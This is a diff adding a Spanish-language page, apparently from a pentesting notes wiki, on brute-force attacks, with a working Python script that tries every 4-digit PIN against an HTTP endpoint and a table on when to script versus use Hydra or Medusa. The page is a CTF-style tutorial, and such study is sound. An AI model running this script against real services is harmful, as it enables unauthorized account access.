@@ -1,0 +1,45 @@
+---
+icon: globe-www
+---
+
+# Ataques de fuerza bruta
+
+> Cuando el objetivo no es un servicio estándar soportado por Hydra/Medusa (ej. un endpoint HTTP a medida, un PIN numérico, un token propietario), un script propio en Python suele ser más rápido de escribir que forzar el caso en una herramienta genérica.
+
+### Caso: PIN numérico de 4 dígitos vía HTTP
+
+Escenario típico: un endpoint `GET /pin?pin=XXXX` que responde con éxito y una flag/token si el PIN coincide, o error en caso contrario. Con solo 10,000 combinaciones posibles (0000-9999), la fuerza bruta es trivial.
+
+```python
+import requests
+
+ip = "127.0.0.1"  # IP del objetivo
+port = 1234       # Puerto del objetivo
+
+for pin in range(10000):
+    formatted_pin = f"{pin:04d}"  # 7 -> "0007"
+    print(f"Attempted PIN: {formatted_pin}")
+
+    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
+
+    if response.ok and 'flag' in response.json():
+        print(f"Correct PIN found: {formatted_pin}")
+        print(f"Flag: {response.json()['flag']}")
+        break
+```
+
+Lógica: itera todos los PIN posibles, envía la petición GET con cada uno, y comprueba el código de estado (200) junto al contenido de la respuesta para detectar el acierto.
+
+### Cuándo escribir un script en vez de usar Hydra
+
+| Situación                                                                                        | Recomendación                               |
+| ------------------------------------------------------------------------------------------------ | ------------------------------------------- |
+| Servicio estándar (SSH, FTP, HTTP form básico)                                                   | Hydra/Medusa                                |
+| Endpoint HTTP con lógica de respuesta no estándar (JSON, tokens, headers custom)                 | Script propio con `requests`                |
+| Espacio de búsqueda pequeño y bien definido (PIN, ID numérico)                                   | Script propio, generación directa del rango |
+| Necesidad de encadenar lógica (extraer token de una respuesta y usarlo en la siguiente petición) | Script propio                               |
+
+### Referencias cruzadas
+
+* `fundamentos-de-fuerza-bruta` — tipos de ataque y matemática de combinaciones.
+* `hydra` — herramienta genérica para servicios estándar.
